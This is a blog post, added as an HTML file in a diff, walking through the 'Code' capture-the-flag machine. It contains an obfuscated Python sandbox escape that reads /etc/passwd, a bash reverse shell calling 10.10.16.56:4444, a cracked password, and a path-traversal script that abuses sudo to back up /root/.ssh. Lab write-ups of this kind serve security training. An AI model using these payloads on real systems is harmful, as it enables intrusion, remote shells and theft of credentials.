@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - Code - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - Code</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1742925710703"
+                  >2025-03-25 19:01</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1743073449976"
+                  >2025-03-27 12:04</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><div><pre class="hljs"><code>└──╼ $<span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span>- <span class="hljs-number">10.129</span>.<span class="hljs-number">37.54</span>
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">57</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">37.54</span>
+Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.054</span>s latency).
+Not shown: <span class="hljs-number">65533</span> closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+<span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh
+<span class="hljs-number">5000</span>/tcp <span class="hljs-keyword">open</span>  upnp</code></pre></div>
+<p>On port 5000 we get a site, a python compiling site. Nice.</p>
+<p><img src="/_resources/68f0444190f0476483c45bdc3cd1e95c.png" /></p>
+<p>The thing is, it got a few restrictions. Not so nice. Any imports are forbidden and most of the fun stuff. List of banned stuff:</p>
+<ul>
+<li><code>open</code></li>
+<li><code>__builtins__</code></li>
+<li><code>eval</code></li>
+<li><code>exec</code></li>
+<li><code>os</code></li>
+<li><code>system</code></li>
+<li><code>write</code></li>
+<li><code>base64</code></li>
+<li><code>popen</code></li>
+</ul>
+<p><img src="/_resources/2150e56333fb4a27a8a50b056ab47e64.png" /></p>
+<p>First working iteration:</p>
+<div><pre class="hljs"><code><span class="hljs-attr">b</span> = globals()[<span class="hljs-string">""</span>.join(chr(x) for x in [<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">98</span>, <span class="hljs-number">117</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>])]
+<span class="hljs-attr">i</span> = b[<span class="hljs-string">""</span>.join(chr(x) for x in [<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">116</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>])]
+<span class="hljs-attr">m</span> = i(<span class="hljs-string">""</span>.join(chr(x) for x in [<span class="hljs-number">111</span>, <span class="hljs-number">115</span>]))
+
+<span class="hljs-attr">s</span> = i(<span class="hljs-string">""</span>.join(chr(x) for x in [<span class="hljs-number">115</span>, <span class="hljs-number">117</span>, <span class="hljs-number">98</span>, <span class="hljs-number">112</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>]))
+<span class="hljs-attr">content</span> = s.getoutput(<span class="hljs-string">"cat /etc/passwd"</span>)</code></pre></div>
+<p>Using this we can run basicly any code we want, but there are no <code>-c</code>, <code>-e</code> flags in this version of netcat so what I’ve done is launch http-server with shell.sh file, got it using wget, run it and got in.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.16.56/4444 0&gt;&amp;1</code></pre></div>
+<h1 id="getting-user">Getting user</h1>
+<p>We can then find in <code>/home/app-production/app/instance</code> file called <code>database.db</code> with the following content when using cat:</p>
+<p><code>Mmartin3de6f30c4a09c27fc71932bfc68474be/ #Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3</code></p>
+<p>Crackstation gets us password for martin: <code>nafeelswordsmaster</code>. We can then ssh as him.</p>
+<h1 id="getting-root">Getting root</h1>
+<p>In home folder we have <code>code_home_app-production_app_2024_August.tar.bz2</code>. Runnig <code>sudo -l</code> we learn that we can run <code>/usr/bin/backy.sh</code> with sudo.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+
+<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$#</span> -ne 1 ]]; <span class="hljs-keyword">then</span>
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$0</span> &lt;task.json&gt;"</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+json_file=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
+
+<span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">"<span class="hljs-variable">$json_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: File '<span class="hljs-variable">$json_file</span>' not found."</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+allowed_paths=(<span class="hljs-string">"/var/"</span> <span class="hljs-string">"/home/"</span>)
+
+updated_json=$(/usr/bin/jq <span class="hljs-string">'.directories_to_archive |= map(gsub("\\.\\./"; ""))'</span> <span class="hljs-string">"<span class="hljs-variable">$json_file</span>"</span>)
+
+/usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$updated_json</span>"</span> &gt; <span class="hljs-string">"<span class="hljs-variable">$json_file</span>"</span>
+
+directories_to_archive=$(/usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$updated_json</span>"</span> | /usr/bin/jq -r <span class="hljs-string">'.directories_to_archive[]'</span>)
+
+<span class="hljs-function"><span class="hljs-title">is_allowed_path</span></span>() {
+    <span class="hljs-built_in">local</span> path=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
+    <span class="hljs-keyword">for</span> allowed_path <span class="hljs-keyword">in</span> <span class="hljs-string">"<span class="hljs-variable">${allowed_paths[@]}</span>"</span>; <span class="hljs-keyword">do</span>
+        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$path</span>"</span> == <span class="hljs-variable">$allowed_path</span>* ]]; <span class="hljs-keyword">then</span>
+            <span class="hljs-built_in">return</span> 0
+        <span class="hljs-keyword">fi</span>
+    <span class="hljs-keyword">done</span>
+    <span class="hljs-built_in">return</span> 1
+}
+
+<span class="hljs-keyword">for</span> dir <span class="hljs-keyword">in</span> <span class="hljs-variable">$directories_to_archive</span>; <span class="hljs-keyword">do</span>
+    <span class="hljs-keyword">if</span> ! is_allowed_path <span class="hljs-string">"<span class="hljs-variable">$dir</span>"</span>; <span class="hljs-keyword">then</span>
+        /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: <span class="hljs-variable">$dir</span> is not allowed. Only directories under /var/ and /home/ are allowed."</span>
+        <span class="hljs-built_in">exit</span> 1
+    <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">done</span>
+
+/usr/bin/backy <span class="hljs-string">"<span class="hljs-variable">$json_file</span>"</span></code></pre></div>
+<p>task.json:</p>
+<div><pre class="hljs"><code><span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">"destination"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/home/martin/backups/"</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">"multiprocessing"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">"verbose_log"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">"directories_to_archive"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">"/home/app-production/app"</span>
+    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+
+    <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">".*"</span>
+    <span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">}</span></code></pre></div>
+<p>To get root, we can create backup of <code>/root</code>. Our backup has to start with <code>/var</code> or <code>/home</code>. Normally any attempts of adding path traversal to .json file would fail, because of <code>jq</code> command that corrects the files before backy is run. What we can do, is store the file as a variable and then execute the script with it, thus bypassing path traversal blockade. This can be done as following:</p>
+<div><pre class="hljs"><code> #!/bin/bash
+
+<span class="hljs-comment"># Config</span>
+<span class="hljs-attribute">TARGET</span>=<span class="hljs-string">"/var/../root/.ssh/"</span> 
+<span class="hljs-attribute">DEST</span>=<span class="hljs-string">"/home/martin"</span>
+<span class="hljs-attribute">TASK_JSON</span>=<span class="hljs-string">"/tmp/task.json"</span>
+<span class="hljs-attribute">BACKY</span>=<span class="hljs-string">"/usr/bin/backy.sh"</span>
+
+cat &lt;&lt;EOF &gt; <span class="hljs-variable">$TASK_JSON</span>
+{
+<span class="hljs-string">"destination"</span>: <span class="hljs-string">"<span class="hljs-variable">$DEST</span>"</span>,
+<span class="hljs-string">"multiprocessing"</span>: <span class="hljs-literal">true</span>,
+<span class="hljs-string">"verbose_log"</span>: <span class="hljs-literal">true</span>,
+<span class="hljs-string">"directories_to_archive"</span>: [
+<span class="hljs-string">"<span class="hljs-variable">$TARGET</span>"</span>
+]
+}
+EOF
+
+sudo <span class="hljs-variable">$BACKY</span> <span class="hljs-variable">$TASK_JSON</span></code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
